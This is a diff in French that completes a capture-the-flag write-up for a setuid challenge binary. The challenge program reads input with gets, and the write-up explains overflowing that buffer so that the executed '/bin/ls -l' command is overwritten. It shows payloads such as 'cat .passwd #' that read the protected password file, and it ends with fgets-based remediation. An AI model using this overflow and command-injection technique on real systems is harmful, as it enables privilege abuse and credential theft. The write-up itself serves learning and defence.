@@ -138,62 +138,46 @@ Ca a fonctionné à moitié, il semble que des arguments parasites empêche l'ex
 
 ### Étape 3 : Analyse du comportement
 
-On va maintenant chercher à comprendre [élément à analyser].
-
-```bash
-[Commande ou manipulation effectuée]
-```
-
-```bash
-[Résultat obtenu]
-```
-
-[Explication technique : organisation mémoire, comportement du programme, valeurs obtenues, etc.]
+On va maintenant chercher à comprendre comment ceci fonctionne. La pile suit le principe LIFO, Last In First Out. En débordant de la pile, ici un tableau statique, le dernier élément est lu. Ici, la pile est simulée par cmd, et en débordant sur la mémoire allouée par arg, on écrase le "/bin/ls -l", ici par whoami. Sauf que des arguments parasites empêche l'exécution. Mais en jetant un œil sur les caractères interdits on voit que '#' n'y est pas. Donc on peut annuler les arguments parasites en l'utilisant pour les transformer en commentaire.
 
 ### Étape 4 : Exploitation
 
-Maintenant que nous avons identifié [élément nécessaire], nous allons essayer de [objectif de l'étape].
+Maintenant que nous avons trouvés une solution, nous allons essayer de lancer un whoami.
 
 ```bash
-[Commande ou script utilisé]
+app-systeme-ch94@challenge03:~$ ./ch94 
+Enter directory you want to display :                                                                   whoami #
+app-systeme-ch94-cracked
 ```
 
-[Explication du fonctionnement de la commande et des éléments importants.]
+Ca fonctionne, à partir de la tentons de trouver le flag.
 
 ```bash
-[Résultat obtenu]
+app-systeme-ch94@challenge03:~$ ./ch94 
+Enter directory you want to display :                                                                    ls -la #
+total 40
+drwxr-x---  2 app-systeme-ch94-cracked app-systeme-ch94 4096 févr. 13  2023 .
+drwxr-xr-x 65 root                     root             4096 juil.  4  2024 ..
+-r-sr-x---  1 app-systeme-ch94-cracked app-systeme-ch94 8680 févr. 13  2023 ch94
+-r--r-----  1 app-systeme-ch94-cracked app-systeme-ch94  791 févr.  5  2023 ch94.c
+-rw-r-----  1 root                     root               44 févr.  5  2023 .git
+-r--r-----  1 app-systeme-ch94-cracked app-systeme-ch94  793 févr.  5  2023 Makefile
+-r--------  1 app-systeme-ch94-cracked root               30 févr.  5  2023 .passwd
+-r--------  1 root                     root              800 févr. 12  2023 ._perms
+app-systeme-ch94@challenge03:~$ ./ch94 
+Enter directory you want to display :                                                                    cat .passwd #
+Segmentation fault
+app-systeme-ch94@challenge03:~$ ./ch94 
+Enter directory you want to display :                                                                  cat .passwd #
+***************************
 ```
 
-[Interprétation du résultat et vérification de la réussite.]
-
-### Étape 5 : Vérification de l'accès / Résultat final
-
-[Dernière manipulation permettant de vérifier que l'exploitation a fonctionné.]
-
-```bash
-[Commande utilisée]
-```
-
-```bash
-[Résultat obtenu]
-```
-
-On vérifie [élément permettant de confirmer la réussite].
-
-[Conclusion : validation du challenge et résultat obtenu.]
-
----
+Le mot de passe est en poche.
 
 ## 4. Comment se protéger ?
 
-Ici, l'erreur venait de [origine de la vulnérabilité].
+Ici, l'erreur venait de gets qui ne vérifie pas la taille de l'entrée, donc on a pu déborder sur la mémoire et réécrire la commande que l'on voulait..
 
-[Explication de la mauvaise pratique ou de l'erreur de programmation.]
+Pour corriger ce problème, la solution est :
 
-Pour corriger ce problème, plusieurs solutions sont possibles :
-
-- [Première mesure corrective]
-- [Deuxième mesure corrective]
-- [Troisième mesure corrective]
-
-[Conclusion sur les bonnes pratiques permettant d'éviter cette vulnérabilité.]
+Vérifier la taille, et utiliser fgets pour la limiter pour pas qu'elle dépasse la taille de la mémoire allouée.
